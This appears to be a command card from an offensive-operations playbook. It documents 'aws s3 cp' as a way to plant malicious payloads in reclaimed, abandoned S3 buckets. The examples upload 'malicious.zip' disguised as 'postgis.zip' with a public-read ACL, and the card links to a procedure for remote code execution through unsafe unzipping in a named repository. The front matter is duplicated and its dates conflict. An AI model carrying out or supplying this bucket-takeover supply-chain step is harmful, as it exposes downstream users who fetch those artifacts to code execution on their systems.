---
id: 123e4567-e89b-12d3-a456-426614174005
data: 'aws s3 cp local-file s3://bucket-name/path'
tags:
  - aws
  - s3
type: command
output: 'upload: local-file to s3://bucket-name/path'
executor: bash
platforms:
  - AWS
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.234Z'
verified: false
validated: true
submitted: true
---
---
id: 123e4567-e89b-12d3-a456-426614174005
name: aws-s3-cp-upload
type: command
executor: bash
data: |
  aws s3 cp local-file s3://bucket-name/path
output: upload: local-file to s3://bucket-name/path
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
platforms: ["AWS", "Linux", "macOS"]
tags: ["aws", "s3"]
---

# aws s3 cp upload

## Command

```bash
aws s3 cp local-file s3://bucket-name/path
```

## Description

Uploads files to S3, used to place malicious payloads in reclaimed buckets for downstream exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `local-file` | Source file path | Yes |
| `s3://bucket-name/path` | Destination in S3 | Yes |

## Examples

### Basic Usage

```bash
aws s3 cp malicious.zip s3://abandoned-bucket-name/
```

### Advanced Usage

```bash
aws s3 cp malicious.zip s3://abandoned-bucket-name/postgis.zip --acl public-read
```

## Expected Output

"upload: malicious.zip to s3://abandoned-bucket-name/postgis.zip".

## Related

- [[commands/aws-s3-mb-create-bucket]]
- [[procedures/Exploit-Unsafe-Unzip-in-Mason-Repository-for-RCE]]
